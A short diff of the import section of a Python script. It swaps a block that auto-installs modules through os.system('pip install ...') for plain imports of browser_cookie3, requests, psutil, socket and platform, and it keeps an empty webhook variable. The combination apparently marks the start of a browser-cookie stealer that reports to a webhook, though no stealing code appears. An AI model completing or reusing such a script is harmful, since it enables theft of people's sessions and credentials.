@@ -1,22 +1,11 @@
 import os
 import time
-try:
-   import platform 
-   import requests
-   import browser_cookie3
-   import json
-   import socket
-   import os
-   import psutil
-except:
-   os.system('pip install platform')
-   os.system('pip install requests')
-   os.system('pip install browser_cookie3')
-   os.system('pip install json')
-   os.system('pip install socket')
-   os.system('pip install psutil')
-   print("run again")
-   time.sleep(5)
+import platform
+import psutil
+import requests
+import browser_cookie3
+import json
+import socket
 webhook = ''
 
 
